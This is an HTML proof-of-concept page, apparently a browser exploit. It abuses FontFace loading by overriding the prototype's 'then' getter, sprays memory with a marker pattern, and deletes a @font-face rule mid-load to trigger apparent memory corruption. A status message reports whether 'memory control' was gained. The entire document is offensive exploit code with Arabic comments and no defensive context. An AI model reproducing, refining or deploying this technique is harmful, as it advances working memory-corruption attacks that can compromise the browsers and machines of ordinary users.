<!DOCTYPE html>
<html>
<head>
    <style id="s">
        @font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
    </style>
</head>
<body>
    <div id="debug" style="color:blue; font-family:monospace;">Status: Probing Memory...</div>
    <script>
        const debug = document.getElementById('debug');
        
        window.onload = () => {
            let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
            document.fonts.add(A);
            
            let fired = false;
            Object.defineProperty(FontFace.prototype, 'then', {
                configurable: true,
                get() {
                    if (!fired && this === A) {
                        fired = true;
                        
                        // تخصيص "نمط" (Pattern)
                        const PATTERN = 0x42424242;
                        let spray = new Uint32Array(100).fill(PATTERN);
                        
                        document.getElementById('s').sheet.deleteRule(0);
                        document.body.offsetTop;
                        
                        // التحقق: هل لا يزال النمط كما هو أم تغير؟
                        if (spray[5] !== PATTERN) {
                            debug.innerText = "!! SUCCESS: Memory Control Verified. Pattern changed to: " + spray[5].toString(16);
                        } else {
                            debug.innerText = "Status: No corruption yet. Need to refine 'Spray' timing.";
                        }
                    }
                    return undefined;
                }
            });

            document.fonts.load('1em x', 'AB').catch(() => {});
        };
    </script>
</body>
</html>
